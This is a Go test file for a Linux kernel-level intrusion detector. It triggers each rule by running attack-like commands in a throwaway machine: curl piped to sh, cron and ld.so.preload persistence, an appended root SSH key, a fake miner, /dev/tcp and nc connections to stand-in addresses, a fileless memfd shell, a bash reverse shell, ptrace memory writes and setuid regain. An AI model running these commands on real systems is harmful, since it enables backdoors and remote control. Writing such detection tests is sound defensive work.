//go:build linux

package live

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"testing"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

// A copy of the test binary named like a service becomes a shell in place,
// so the shell starts under that service's name without needing bash.
func init() {
	if command := os.Getenv("DEACONGUARD_LIVE_TEST_EXEC"); command != "" {
		os.Unsetenv("DEACONGUARD_LIVE_TEST_EXEC")
		syscall.Exec("/bin/sh", []string{"sh", "-c", command}, os.Environ())
		os.Exit(1)
	}
	switch os.Getenv("DEACONGUARD_LIVE_TEST_DO") {
	case "lowered":
		// A root process that lowers its IDs for a while and takes root
		// back, as PAM and runuser do: not reported. Raw calls, on the main
		// thread, which /proc reports.
		unix.RawSyscall(unix.SYS_SETRESUID, 1000, 1000, 0)
		unix.RawSyscall(unix.SYS_SETUID, 0, 0, 0)
		time.Sleep(time.Second)
		os.Exit(0)
	case "root":
		// Starts a program running as a user, but with root as its
		// effective ID, as an exploit leaves one...
		unix.RawSyscall(unix.SYS_SETRESUID, 1000, 0, 0)
		self, _ := os.Executable()
		env := []string{"DEACONGUARD_LIVE_TEST_DO=regain"}
		for _, variable := range os.Environ() {
			if !strings.HasPrefix(variable, "DEACONGUARD_LIVE_TEST_DO=") {
				env = append(env, variable)
			}
		}
		syscall.Exec(self, []string{self, "regain"}, env)
		os.Exit(1)
	case "regain":
		// ...which makes itself root.
		unix.RawSyscall(unix.SYS_SETUID, 0, 0, 0)
		time.Sleep(time.Second)
		os.Exit(0)
	case "module":
		// Loads a file that isn't a module: the kernel refuses it.
		if file, err := os.Open(os.Getenv("DEACONGUARD_LIVE_TEST_FILE")); err == nil {
			unix.FinitModule(int(file.Fd()), "dgtest=1", 0)
			time.Sleep(time.Second)
		}
		os.Exit(0)
	case "victim":
		// Says where its buffer is, then waits to be written to.
		fmt.Println(uintptr(unsafe.Pointer(&victimBuffer[0])))
		time.Sleep(5 * time.Second)
		os.Exit(0)
	case "trace":
		// Attaches to a victim, then writes into its memory.
		self, _ := os.Executable()
		victim := exec.Command(self)
		victim.Env = append(os.Environ(), "DEACONGUARD_LIVE_TEST_DO=victim")
		output, _ := victim.StdoutPipe()
		if victim.Start() != nil {
			os.Exit(1)
		}
		var address uintptr
		fmt.Fscan(output, &address)
		pid := victim.Process.Pid
		runtime.LockOSThread()
		if unix.PtraceAttach(pid) == nil {
			var status unix.WaitStatus
			unix.Wait4(pid, &status, 0, nil)
			unix.PtraceDetach(pid)
		}
		data := []byte("dgtest")
		unix.ProcessVMWritev(pid, []unix.Iovec{{Base: &data[0], Len: uint64(len(data))}},
			[]unix.RemoteIovec{{Base: address, Len: len(data)}}, 0)
		time.Sleep(time.Second)
		victim.Process.Kill()
		victim.Wait()
		os.Exit(0)
	}
}

var victimBuffer [64]byte

// TestKernel loads the watchers into the running kernel and triggers each
// rule. It needs root and a kernel that can run them, so it runs only with
// DEACONGUARD_LIVE_TEST=1, in a throwaway machine or privileged container
// sharing the machine's process namespace.
func TestKernel(t *testing.T) {
	if os.Getenv("DEACONGUARD_LIVE_TEST") != "1" {
		t.Skip("set DEACONGUARD_LIVE_TEST=1 to load the watchers into this kernel")
	}
	detector := NewDetector(os.Getenv("DEACONGUARD_HOST_ROOT"), t.Logf)
	detector.SetEnabled(true)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go detector.Run(ctx)
	deadline := time.Now().Add(10 * time.Second)
	for {
		status, _ := detector.Take()
		if status.State == StateActive {
			break
		}
		if status.State == StateUnsupported || status.State == StateStopped || time.Now().After(deadline) {
			t.Fatalf("detection didn't start: %+v", status)
		}
		time.Sleep(100 * time.Millisecond)
	}
	// The commands below are this test's children, which the rules take
	// for the agent's own unless it goes by another name meanwhile.
	agent := agentName
	agentName = "not-the-agent"
	run := func(script string) {
		if output, err := exec.Command("sh", "-c", script).CombinedOutput(); err != nil {
			t.Logf("%s: %v %s", script, err, output)
		}
	}
	run("cp /bin/true /tmp/dropper && /tmp/dropper && rm -f /tmp/dropper")
	self, _ := os.Executable()
	run("cp " + self + " /tmp/nginx && DEACONGUARD_LIVE_TEST_EXEC='id >/dev/null' /tmp/nginx; rm -f /tmp/nginx")
	run("cp /bin/true /usr/local/bin/xmrig && /usr/local/bin/xmrig --url stratum+tcp://pool.example:3333; rm -f /usr/local/bin/xmrig")
	run("setsid sh -c 'curl -fsS http://127.0.0.1:1/x | sh' </dev/null >/dev/null 2>&1")
	run("echo '* * * * * root true' > /etc/cron.d/dgtest && rm -f /etc/cron.d/dgtest")
	run("cd /etc && touch ld.so.preload && rm -f ld.so.preload")
	run("mkdir -p /root/.ssh && echo key >> /root/.ssh/authorized_keys")
	run("echo hello > /etc/hostname.dgtest; rm -f /etc/hostname.dgtest")

	// Privilege, module and ptrace: copies of this test, which the
	// watchers don't take for the agent.
	self, _ = os.Executable()
	do := func(what string, env ...string) {
		command := exec.Command(self)
		command.Env = append(append(os.Environ(), "DEACONGUARD_LIVE_TEST_DO="+what), env...)
		if output, err := command.CombinedOutput(); err != nil {
			t.Logf("%s: %v %s", what, err, output)
		}
	}
	do("lowered")
	do("root")
	os.WriteFile("/tmp/dgmod.ko", []byte("not a module"), 0o644)
	do("module", "DEACONGUARD_LIVE_TEST_FILE=/tmp/dgmod.ko")
	os.Remove("/tmp/dgmod.ko")
	do("trace")

	// Connections: a program from /tmp, and a process it starts after
	// forking; a shell to a pool's port (unroutable, so it times out).
	_, noBash := exec.LookPath("bash")
	if noBash == nil {
		run("cp /bin/bash /tmp/dgnet && timeout 1 /tmp/dgnet -c 'exec 3<>/dev/tcp/203.0.113.9/443'; rm -f /tmp/dgnet")
		run("cp /bin/bash /tmp/dgfork && timeout 1 /tmp/dgfork -c '(cat < /dev/tcp/203.0.113.10/8443)'; rm -f /tmp/dgfork")
		run("timeout 1 bash -c 'exec 3<>/dev/tcp/203.0.113.9/3333'")
	} else {
		// BusyBox only, as in a minimal VM: its nc, copied to /tmp under
		// its own name, and started by a shell copied there.
		run("cp /bin/busybox /tmp/nc && timeout 2 /tmp/nc -w 1 203.0.113.9 443; rm -f /tmp/nc")
		run("cp /bin/busybox /tmp/sh && timeout 2 /tmp/sh -c 'nc -w 1 203.0.113.10 8443; true'; rm -f /tmp/sh")
		run("timeout 2 nc -w 1 203.0.113.9 3333")
	}
	// A shell run from memory, without a file, connects out a second later:
	// the agent marks it once it sees where it runs from.
	if noBash == nil {
		if fd, err := unix.MemfdCreate("dgmem", 0); err == nil {
			memory := os.NewFile(uintptr(fd), "dgmem")
			if program, err := os.ReadFile("/bin/bash"); err == nil {
				memory.Write(program)
				shell := exec.Command("/proc/self/fd/3", "-c", "sleep 1; exec 3<>/dev/tcp/203.0.113.11/443")
				shell.Args[0] = "bash"
				shell.ExtraFiles = []*os.File{memory}
				done := make(chan struct{})
				go func() { shell.Run(); close(done) }()
				select {
				case <-done:
				case <-time.After(4 * time.Second):
					shell.Process.Kill()
				}
			}
			memory.Close()
		}
	}
	// Reverse shells to a listener here: a shell that connects and takes
	// the connection as its input and output, and one started with it.
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer listener.Close()
	go func() {
		for {
			conn, err := listener.Accept()
			if err != nil {
				return
			}
			defer conn.Close()
		}
	}()
	port := listener.Addr().(*net.TCPAddr).Port
	if noBash == nil {
		run(fmt.Sprintf("setsid bash -c 'timeout 3 bash -i >& /dev/tcp/127.0.0.1/%d 0>&1' </dev/null >/dev/null 2>&1 &", port))
	}
	if conn, err := net.Dial("tcp", listener.Addr().String()); err == nil {
		file, _ := conn.(*net.TCPConn).File()
		shell := exec.Command("sh", "-c", "sleep 2")
		shell.Stdin, shell.Stdout = file, file
		shell.Start()
		defer shell.Wait()
		conn.Close()
		defer file.Close()
	}
	time.Sleep(3 * time.Second)
	agentName = agent
	detector.AskTest()
	time.Sleep(3 * time.Second)
	status, alerts := detector.Take()
	found := map[string]Alert{}
	for _, alert := range alerts {
		t.Logf("%s %s %s | %s | %s | %s", alert.Rule, alert.Severity, alert.Title, alert.Program, alert.Parent, alert.Command)
		key := alert.Rule
		if alert.Test {
			key = "test"
		}
		found[key] = alert
	}
	for _, rule := range []string{RuleTempProgram, RuleServiceShell, RuleMiner, RuleDownloadRun, RulePersistence, RuleSSHLogins, RuleReverseShell, RuleMarkedOut, RulePoolPort,
		RulePrivilege, RuleModule, RuleTrace, RuleMemoryWrite, "test"} {
		if _, ok := found[rule]; !ok {
			t.Errorf("no %s alert", rule)
		}
	}
	forked, fromMemory := false, false
	for _, alert := range alerts {
		forked = forked || alert.Rule == RuleMarkedOut && strings.Contains(alert.Remote, "203.0.113.10")
		fromMemory = fromMemory || alert.Rule == RuleMarkedOut && strings.Contains(alert.Remote, "203.0.113.11")
	}
	if !forked {
		t.Error("no alert for the connection of a process a /tmp program started")
	}
	if !fromMemory && noBash == nil {
		t.Error("no alert for the connection of a program run from memory")
	}
	for _, alert := range alerts {
		if strings.Contains(alert.Path, "hostname") {
			t.Errorf("unwatched file reported: %+v", alert)
		}
	}
	if alert := found[RulePrivilege]; !strings.Contains(alert.Command, "regain") {
		t.Errorf("privilege alert, want only the regained one: %+v", alert)
	}
	if alert := found[RuleModule]; alert.Path != "/tmp/dgmod.ko" || alert.Severity != "CRITICAL" || !strings.Contains(alert.Detail, "dgtest=1") {
		t.Errorf("module alert: %+v", alert)
	}
	t.Logf("status: %+v", status)
	if status.EventsLastHour == 0 || status.Lost != 0 {
		t.Errorf("counters: %+v", status)
	}
}

// TestSoak runs the watchers for DEACONGUARD_LIVE_SOAK seconds and logs
// every alert, to look for false alarms from what a machine ordinarily
// does. It triggers nothing itself.
func TestSoak(t *testing.T) {
	seconds, _ := strconv.Atoi(os.Getenv("DEACONGUARD_LIVE_SOAK"))
	if seconds <= 0 {
		t.Skip("set DEACONGUARD_LIVE_SOAK=SECONDS to watch this kernel for false alarms")
	}
	detector := NewDetector(os.Getenv("DEACONGUARD_HOST_ROOT"), t.Logf)
	detector.SetEnabled(true)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go detector.Run(ctx)
	end := time.Now().Add(time.Duration(seconds) * time.Second)
	for time.Now().Before(end) {
		time.Sleep(5 * time.Second)
		status, alerts := detector.Take()
		for _, alert := range alerts {
			t.Logf("ALERT %s %s %s | %s | %s | %s | %s", alert.Rule, alert.Severity, alert.Title, alert.Program, alert.Parent, alert.Path, alert.Command)
		}
		if time.Now().Add(5 * time.Second).After(end) {
			t.Logf("status: %+v", status)
		}
	}
}
